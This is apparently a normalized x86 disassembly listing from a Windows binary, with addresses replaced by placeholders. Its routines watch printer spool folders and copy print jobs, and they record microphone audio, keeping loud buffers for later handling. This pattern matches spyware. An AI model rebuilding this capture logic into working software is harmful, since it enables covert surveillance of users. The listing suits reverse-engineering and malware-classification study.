mov esi rw-data
mov edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
dec eax
mov [ rw-data ] eax
je r-xdata
jmp r-xdata
mov esi [ rw-data ]
imul esi esi 0xc
add esi rw-data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push [ rw-data ]
call [ ReleaseMutex@IAT ]
mov al [ ebp - 0x1 ]
pop edi
pop esi
leave
retn
sub_40bcab
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x1 ] 0x1
cmp [ rw-data ] 0x20
jae r-xdata
mov [ ebp - 0x1 ] 0x0
mov esi [ ebp + 0x8 ]
mov edi [ rw-data ]
imul edi edi 0xc
add edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call [ ReleaseMutex@IAT ]
mov al [ ebp - 0x1 ]
pop edi
pop esi
leave
retn
sub_40bd05
push ebp
mov ebp esp
sub esp 0x21c
push [ ebp + 0xc ]
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x7
push 0xc0000000
lea eax [ ebp - 0x218 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x21c ] eax
cmp [ ebp - 0x21c ] 0xffffffff
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x2
push 0x0
push [ ebp - 0x21c ]
call [ CreateFileMappingW@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
push 0x0
lea edx [ ebp - 0x218 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_40bcab
pop ecx
movzx eax al
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_40bdc3
push ebp
mov ebp esp
sub esp 0x14
push esi
mov edx [ ebp + 0x10 ]
shl edx 0x2
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
pop esi
leave
retn
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x28
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
mov eax [ esi + eax + 0x18 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov al 0x1
push 0xffffffff
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
call [ WaitForMultipleObjects@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
mov eax [ ecx + eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
jmp r-xdata
push 0x800
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
push [ ecx + eax + 0x24 ]
call sub_40103d
pop ecx
pop ecx
push 0x0
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
lea eax [ ecx + eax + 0x8 ]
push eax
push 0x0
push 0x1
push 0x0
push 0x800
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
push [ ecx + eax + 0x24 ]
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
push [ ecx + eax + 0x4 ]
call [ ReadDirectoryChangesW@IAT ]
test eax eax
jge r-xdata
push r--data
mov edx [ ebp - 0xc ]
add edx 0xc
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0xc
push eax
mov eax [ ebp - 0x14 ]
imul eax eax 0x28
mov ecx [ ebp + 0xc ]
push [ ecx + eax + 0x1c ]
push [ ebp + 0x8 ]
call sub_40bd05
add esp 0xc
sub_40bf0d
push ebp
mov ebp esp
mov eax 0x1298
call sub_40a0e0
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
push 0x2710
call [ Sleep@IAT ]
push 0x10
lea edx [ ebp - 0x1294 ]
mov ecx [ ebp - 0x10 ]
call sub_413c8f
lea edx [ ebp - 0x1294 ]
mov ecx [ ebp - 0x10 ]
call sub_411c67
mov [ ebp - 0x126c ] eax
push 0x0
push 0x0
push 0x2
push 0x0
push 0x0
push 0x40000000
push [ ebp - 0x126c ]
call [ CreateFileW@IAT ]
mov [ ebp - 0x1270 ] eax
cmp [ ebp - 0x1270 ] 0xffffffff
jne r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
and [ ebp - 0x1298 ] 0x0
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417232
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40bc42
pop ecx
movzx eax al
test eax eax
jne r-xdata
push [ ebp - 0x1270 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x1268 ]
push eax
push [ ebp - 0x4 ]
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
lea eax [ ebp - 0x1014 ]
push eax
push 0x1000
lea eax [ ebp - 0x1010 ]
push eax
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
cmp [ ebp - 0x1014 ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417232
push 0x0
mov edx [ ebp - 0x126c ]
mov ecx [ ebp - 0x10 ]
call sub_411ff4
mov edx [ ebp - 0x126c ]
mov ecx [ ebp - 0x10 ]
call sub_417232
jmp r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x1268 ]
push eax
push [ ebp - 0x126c ]
push 0x703cf202
push 0x703cf201
mov ecx [ ebp - 0x10 ]
call sub_412619
mov eax [ ebp - 0x1298 ]
add eax [ ebp - 0x1014 ]
mov [ ebp - 0x1298 ] eax
push 0x0
lea eax [ ebp - 0x1274 ]
push eax
push [ ebp - 0x1014 ]
lea eax [ ebp - 0x1010 ]
push eax
push [ ebp - 0x1270 ]
call [ WriteFile@IAT ]
jmp r-xdata
jmp r-xdata
xor eax eax
inc eax
je r-xdata
sub_40c0a8
push ebp
mov ebp esp
sub esp 0x73c
and [ ebp - 0x514 ] 0x0
mov [ ebp - 0x510 ] 0x400
mov edx [ ebp - 0x510 ]
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x50c ] eax
lea eax [ ebp - 0x514 ]
push eax
lea eax [ ebp - 0x510 ]
push eax
push [ ebp - 0x510 ]
push [ ebp - 0x50c ]
push 0x1
push 0x0
push 0x2
call EnumPrintersW
test eax eax
jne r-xdata
mov eax [ ebp - 0x50c ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x518 ] 0x0
jmp r-xdata
push [ ebp - 0x510 ]
mov edx [ ebp - 0x50c ]
mov ecx [ ebp + 0x8 ]
call sub_41728e
mov [ ebp - 0x50c ] eax
lea eax [ ebp - 0x514 ]
push eax
lea eax [ ebp - 0x510 ]
push eax
push [ ebp - 0x510 ]
push [ ebp - 0x50c ]
push 0x1
push 0x0
push 0x6
call EnumPrintersW
test eax eax
jne r-xdata
mov eax [ ebp - 0x518 ]
cmp eax [ ebp - 0x514 ]
jae r-xdata
mov edx [ ebp - 0x50c ]
mov ecx [ ebp + 0x8 ]
call sub_417232
xor al al
jmp r-xdata
mov edx [ ebp - 0x50c ]
mov ecx [ ebp + 0x8 ]
call sub_417232
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
cmp [ ebp - 0x518 ] 0x20
jae r-xdata
leave
retn
push 0x0
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor al al
jmp r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
lea eax [ ebp + eax - 0x508 ]
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x8 ]
call OpenPrinterW
test eax eax
je r-xdata
and [ ebp - 0x73c ] 0x0
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
push sub_40bf0d
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x738 ] eax
cmp [ ebp - 0x738 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x730 ] 0x208
lea eax [ ebp - 0x730 ]
push eax
push 0x208
lea eax [ ebp - 0x728 ]
push eax
push 0x0
push r--data
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call GetPrinterDataW
test eax eax
jge r-xdata
mov eax [ ebp - 0x73c ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x508 ]
push eax
push [ ebp + 0x8 ]
call sub_40bdc3
add esp 0xc
mov eax [ ebp - 0x518 ]
inc eax
mov [ ebp - 0x518 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x10
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x519 ] 0x1
and [ ebp - 0x734 ] 0x0
and [ ebp - 0x734 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call ClosePrinter
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x73c ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call ClosePrinter
mov eax [ ebp - 0x73c ]
imul eax eax 0x28
push [ ebp + eax - 0x504 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x73c ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4e8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x73c ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4ec ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x73c ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4e4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
mov eax [ ebp - 0x734 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebp - 0x73c ]
inc eax
mov [ ebp - 0x73c ] eax
movzx eax [ ebp - 0x519 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x728 ]
push eax
mov eax [ ebp - 0x734 ]
imul eax eax 0x28
push [ ebp + eax - 0x4ec ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
push 0x0
lea edx [ ebp - 0x728 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov [ ebp + ecx - 0x4ec ] eax
push 0x0
push 0x42000000
push 0x3
push 0x0
push 0x5
push 0x1
lea eax [ ebp - 0x728 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x72c ] eax
cmp [ ebp - 0x72c ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call ClosePrinter
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x519 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
mov ecx [ ebp - 0x72c ]
mov [ ebp + eax - 0x504 ] ecx
push 0x14
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
lea eax [ ebp + eax - 0x500 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x0
push 0x0
push 0x0
push 0x0
call [ CreateEventW@IAT ]
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov [ ebp + ecx - 0x4f0 ] eax
mov edx 0x800
mov ecx [ ebp + 0x8 ]
call sub_417318
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov [ ebp + ecx - 0x4e4 ] eax
push 0x800
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x4e4 ]
call sub_40103d
pop ecx
pop ecx
push 0x0
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
lea eax [ ebp + eax - 0x500 ]
push eax
push 0x0
push 0x1
push 0x0
push 0x800
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x4e4 ]
push [ ebp - 0x72c ]
call [ ReadDirectoryChangesW@IAT ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4ec ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call ClosePrinter
jmp r-xdata
mov eax [ ebp - 0x734 ]
inc eax
mov [ ebp - 0x734 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov [ ebp + ecx - 0x4e8 ] eax
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4ec ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
mov edx [ ebp + eax - 0x4e4 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x504 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
imul eax eax 0x28
push [ ebp + eax - 0x508 ]
call ClosePrinter
jmp r-xdata
sub_40c540
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_402b50
add esp 0xc
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn
sub_40c560
push ebp
mov ebp esp
sub esp 0x10
cmp [ rw-data ] 0x0
jle r-xdata
mov [ ebp - 0x8 ] 0xff
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x19
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
dec eax
mov [ rw-data ] eax
mov al 0x1
jmp r-xdata
cmp [ ebp - 0x10 ] 0x13880
jge r-xdata
leave
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movzx eax [ eax ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
xor al al
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movzx eax [ eax ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
sub_40c5ef
push ebp
mov ebp esp
sub esp 0xc4
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventW@IAT ]
mov [ ebp - 0xb4 ] eax
mov al 0x1
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x1a ] 0x1
mov [ ebp - 0x18 ] 0x1f40
mov [ ebp - 0x10 ] 0x1
movzx eax [ ebp - 0x10 ]
imul eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xe ] 0x8
and [ ebp - 0xc ] 0x0
push [ ebp - 0xb4 ]
call [ ResetEvent@IAT ]
push 0x50000
push 0x0
push [ ebp - 0xb4 ]
lea eax [ ebp - 0x1c ]
push eax
push 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
call [ waveInOpen@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
movzx eax [ ebp - 0x10 ]
imul eax [ ebp - 0x18 ]
imul eax eax 0xa
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xac ] eax
and [ ebp - 0xbc ] 0x0
jmp r-xdata
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0xbc ] 0x4
jge r-xdata
xor eax eax
inc eax
je r-xdata
push [ ebp - 0xb4 ]
call [ ResetEvent@IAT ]
push [ ebp - 0x8 ]
call [ waveInStart@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_417318
mov ecx [ ebp - 0xbc ]
shl ecx 0x5
mov [ ebp + ecx - 0xa8 ] eax
mov eax [ ebp - 0xbc ]
shl eax 0x5
cmp [ ebp + eax - 0xa8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_413b96
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xb5 ] 0x0
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
shl eax 0x5
mov ecx [ ebp - 0x24 ]
mov [ ebp + eax - 0xa4 ] ecx
mov eax [ ebp - 0xbc ]
shl eax 0x5
and [ ebp + eax - 0x98 ] 0x0
call sub_4137bf
mov ecx [ ebp - 0xbc ]
shl ecx 0x5
mov [ ebp + ecx - 0x9c ] eax
push 0x20
mov eax [ ebp - 0xbc ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInPrepareHeader@IAT ]
mov [ ebp - 0x20 ] eax
push 0x20
mov eax [ ebp - 0xbc ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInAddBuffer@IAT ]
mov [ ebp - 0x20 ] eax
push 0x44c
call [ Sleep@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
and [ ebp - 0xc4 ] 0x0
jmp r-xdata
push 0x1388
call [ Sleep@IAT ]
push [ ebp - 0xb4 ]
call [ ResetEvent@IAT ]
and [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xbc ]
inc eax
mov [ ebp - 0xbc ] eax
leave
retn
cmp [ ebp - 0xc4 ] 0x4
jge r-xdata
cmp [ ebp - 0xc0 ] 0x4
jge r-xdata
jmp r-xdata
push 0x20
mov eax [ ebp - 0xc4 ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInUnprepareHeader@IAT ]
mov eax [ ebp - 0xc4 ]
shl eax 0x5
mov edx [ ebp + eax - 0xa8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc0 ]
shl eax 0x5
mov eax [ ebp + eax - 0x98 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0xc4 ]
inc eax
mov [ ebp - 0xc4 ] eax
movzx eax [ ebp - 0xb5 ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc0 ]
shl eax 0x5
push [ ebp + eax - 0xa8 ]
call sub_40c560
pop ecx
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0xc0 ]
inc eax
mov [ ebp - 0xc0 ] eax
push 0x20
mov eax [ ebp - 0xc0 ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInUnprepareHeader@IAT ]
mov eax [ ebp - 0xc0 ]
shl eax 0x5
mov ecx [ ebp - 0x24 ]
mov [ ebp + eax - 0xa4 ] ecx
mov eax [ ebp - 0xc0 ]
shl eax 0x5
and [ ebp + eax - 0x98 ] 0x0
call sub_4137bf
mov ecx [ ebp - 0xc0 ]
shl ecx 0x5
mov [ ebp + ecx - 0x9c ] eax
push 0x20
mov eax [ ebp - 0xc0 ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInPrepareHeader@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xac ] eax
lea eax [ ebp - 0xac ]
push eax
push [ ebp - 0x4 ]
mov eax [ ebp - 0xc0 ]
shl eax 0x5
push [ ebp + eax - 0xa4 ]
mov eax [ ebp - 0xc0 ]
shl eax 0x5
push [ ebp + eax - 0xa8 ]
call sub_40c540
add esp 0x10
push [ ebp - 0xac ]
push 0x0
push 0x14
mov eax [ ebp - 0xc0 ]
shl eax 0x5
push [ ebp + eax - 0x9c ]
push [ ebp - 0xb0 ]
push 0x70677616
push [ ebp - 0xac ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_41578c
push 0x20
mov eax [ ebp - 0xc0 ]
shl eax 0x5
lea eax [ ebp + eax - 0xa8 ]
push eax
push [ ebp - 0x8 ]
call [ waveInAddBuffer@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0xb5 ] 0x1
jmp r-xdata
mov [ ebp - 0xb5 ] 0x1
jmp r-xdata
sub_40c9d3
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ UuidCreate@IAT ]
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
movzx eax [ ebp - 0x1 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx eax [ ebp - 0x3 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push r--data
push [ ebp + 0x8 ]
call [ wsprintfW@IAT ]
add esp 0x34
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_40ca3e
push ebp
mov ebp esp
sub esp 0x6c
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0xc ] 0x1
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push 0x0
call [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
dec eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0xd ]
leave
retn
push 0x48
lea eax [ ebp - 0x60 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x0
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x58 ] 0x3
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x8 ]
cmp [ ebp - 0x58 ] 0x400
jae r-xdata
mov [ ebp - 0x6c ] 0x400
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
cmp eax [ ebp - 0x58 ]
jb r-xdata
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
and [ ebp - 0x64 ] 0x0
and [ ebp - 0x68 ] 0x0
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xd ] 0x1
and [ ebp - 0xc ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x8000000a
je r-xdata
mov eax [ ebp - 0x68 ]
add eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x64 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x68 ]
cmp eax [ ebp - 0x58 ]
jae r-xdata
sub_40cb71
push ebp
mov ebp esp
mov eax 0xd418
call sub_40a0e0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
leave
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
mov [ ebp - 0x9410 ] eax
push 0x8000
lea eax [ ebp - 0x9408 ]
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0xd410 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0xd410 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push 0x3
push r--data
lea eax [ ebp - 0xd410 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x8 ]
add eax 0xc
push eax
push r--data
lea eax [ ebp - 0xd410 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x9410 ]
push r--data
lea eax [ ebp - 0xd410 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x9410 ]
imul ecx [ eax + 0x8c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax ecx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x8c ] eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x9410 ]
imul ecx [ eax + 0x8c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax ecx
mov [ ebp - 0xd414 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8c ]
mov [ ebp - 0xd414 ] eax
jmp r-xdata
mov [ ebp - 0xd418 ] 0xfff
lea eax [ ebp - 0x1000 ]
push eax
call [ lstrlenA@IAT ]
mov [ ebp - 0xd418 ] eax
jmp r-xdata
lea eax [ ebp - 0x1000 ]
push eax
push [ ebp - 0xd414 ]
